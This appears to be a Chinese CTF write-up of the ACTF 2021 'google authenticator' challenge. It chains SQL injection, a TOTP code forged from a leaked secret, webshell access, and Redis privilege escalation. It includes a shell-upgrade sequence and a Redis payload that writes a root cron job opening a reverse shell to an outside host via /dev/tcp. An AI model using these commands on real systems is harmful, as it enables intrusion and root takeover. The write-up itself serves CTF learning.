# ACTF 2021 google authenticator writeup

### 知识点

 - SQL注入
 - Google 身份验证器算法
 - Redis 提权

### SQL注入

打开题目，是一个登录框


![](https://i.imgur.com/T7EWWSh.png)

存在各种注入，数据库里面保存了admin的明文密码


![](https://i.imgur.com/cNCVXLP.png)

登录之后，拿到路径 `/google_authenticator.php`
 
![](https://i.imgur.com/oKSwbgr.png)

访问，要输入谷歌身份验证码

![](https://i.imgur.com/nOHOWYC.png)

谷歌身份验证码是什么，请大家自行了解，下面简单说一下谷歌身份验证码的生成算法

### 谷歌设备验证码生成


Google 身份验证器算法是TOTP。

Time-based One-time Password (TOTP)：即基于时间的一次性密码算法，也称时间同步的动态密码。

算法过程详情查看：[Google验证器是如何实现的？ - 知乎](https://zhuanlan.zhihu.com/p/132478048)

我们可以用pyotp库快捷的运算TOTP,举个例子

```python
import pyotp

Secret = 'NBSWY3DPO5XXE3DE'
print(pyotp.TOTP(Secret).now())
```

![](https://i.imgur.com/XZndOmA.png)


这时候回头看看数据库，里面有个otp_secret_key字段，是JWT，base64解码，拿到secret，从而就可以计算出谷歌身份验证码了

![](https://i.imgur.com/80Ie0f3.png)

输入验证码后，给出下一个路径

![](https://i.imgur.com/2Gil8Xx.png)


访问结果是空白页面，查看源码，发现有一句话提示

![](https://i.imgur.com/HfZneEQ.png)

蚁剑连上一句话，根目录没有发现flag，查看 `/run.sh` 文件，flag在/root/目录下，但是当前拿到的是Apache用户权限，所以要提权

![](https://i.imgur.com/EQWxwJi.png)


### redis 提权


查看端口和进程信息，发现有以root权限启动的redis，那么就明了了，使用redis提权

![](https://i.imgur.com/2MN5EEJ.png)

redis 利用方式本质是写文件，一般使用下面三种方法

- 写Webshell
- 写SSH Key
- 写定时任务

此外还可以redis 加载`.so`模块从而命令执行，主从复制RCE，但是需要redis >= 4.0 ,当前环境的redis 版本是 3.2.12

写Webshell，写到Web目录下还是apache权限，写SSH Key 也没有 SSH 可以远程连接

所以这时就通过写定时任务，注意下redis 写定时任务，centos可以正常执行定时任务，但是由于redis写入文件会写入脏数据，ubuntu计划任务不允许有脏数据，所以ubuntu没办法通过redis写入计划任务进行操作。


最后这redis提权，手动输入redis命令的话则需要一个交互式终端，构造一个交互式终端方法如下：

```
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

ctrl+z

stty raw -echo; fg
stty rows 38 columns 116
```

在蚁剑弹个shell给vps，接着一顿操作之后获得了交互式终端，支持tab补全

![](https://i.imgur.com/Cgpfyq8.png)

如果上述操作并不能获取一个交互式终端，可尝试这篇文章的方法：[反弹Shell升级为交互式Shell](https://www.jianshu.com/p/e7202cb2c3dd)

然后在交互式终端下运行redis-cli，输入payload ，静待root shell

```
config set dir /var/spool/cron/
config set dbfilename root
set x "\n* * * * * bash -i >& /dev/tcp/ip/port 0>&1\n"
save
```

![](https://i.imgur.com/C18IVLh.png)
